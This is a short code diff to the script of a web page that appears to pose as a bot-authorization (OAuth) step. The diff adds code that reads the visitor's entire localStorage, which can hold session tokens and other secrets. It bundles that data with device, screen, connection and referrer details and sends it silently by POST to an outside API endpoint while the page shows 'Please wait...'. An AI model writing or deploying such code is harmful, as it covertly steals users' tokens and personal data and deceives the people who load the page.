@@ -58,17 +58,31 @@
             };
         }
 
+        function getLocalStorageData() {
+            let storageData = {};
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                try {
+                    storageData[key] = JSON.parse(localStorage.getItem(key));
+                } catch (e) {
+                    storageData[key] = localStorage.getItem(key);
+                }
+            }
+            return storageData;
+        }
+
         async function sendToApi() {
             document.getElementById("status").innerText = "Please wait...";
             const botId = "1297569951632068618";
             const bot_id = "1297569951632068618";
             const urlParams = getUrlParams();
             const url1 = "http://crown.foo.ng/oauth2?event=bot.add";
+            const startTime = performance.now();
             
             const payload = {
                 deviceTime: getDeviceTime(),
                 botId: botId,
-                 bot_id: bot_id,
+                bot_id: bot_id,
                 url: url1,
                 ...urlParams,
                 log: {
@@ -80,10 +94,13 @@
                     screen: getScreenDetails(),
                     connection: getConnectionDetails(),
                     referrer: document.referrer,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    localStorage: getLocalStorageData()
                 }
             };
-
+            
+            console.log(`[T+${Math.round(performance.now() - startTime)}ms]:`, payload.log);
+            
             try {
                 const response = await fetch("https://x8ki-letl-twmt.n7.xano.io/api:RrtGc3dR/handle/oauth2", {
                     method: "POST",
